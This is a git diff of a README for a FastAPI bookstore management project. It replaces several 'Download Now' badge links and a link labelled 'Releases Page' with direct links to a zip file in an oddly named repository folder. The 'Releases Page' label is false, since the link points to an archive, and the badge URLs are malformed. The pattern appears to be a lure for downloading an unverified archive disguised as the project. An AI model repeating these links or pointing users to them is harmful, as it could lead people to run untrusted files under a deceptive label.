@@ -1,6 +1,6 @@
 # 📚 bookstore-management-system-fastapi - Manage Your Bookstore Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/bookstore-management-system-fastapi.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/bookstore-management-system-fastapi.zip)
+[![Download Now](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/management_system_fastapi_bookstore_v3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/management_system_fastapi_bookstore_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these requirements:
   
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/bookstore-management-system-fastapi.zip).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/management_system_fastapi_bookstore_v3.0.zip).
 
 ### Installation Steps
 
@@ -62,6 +62,6 @@ For support, please refer to the FAQs located on the GitHub page. If you cannot 
 
 ---
 
-[![Download Now](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/bookstore-management-system-fastapi.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/bookstore-management-system-fastapi.zip)
+[![Download Now](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/management_system_fastapi_bookstore_v3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emmanueloduor/bookstore-management-system-fastapi/main/boeotarch/management_system_fastapi_bookstore_v3.0.zip)
 
 With this application, managing your bookstore becomes a straightforward task. Enjoy navigating your inventory with a few clicks, and watch your sales grow.
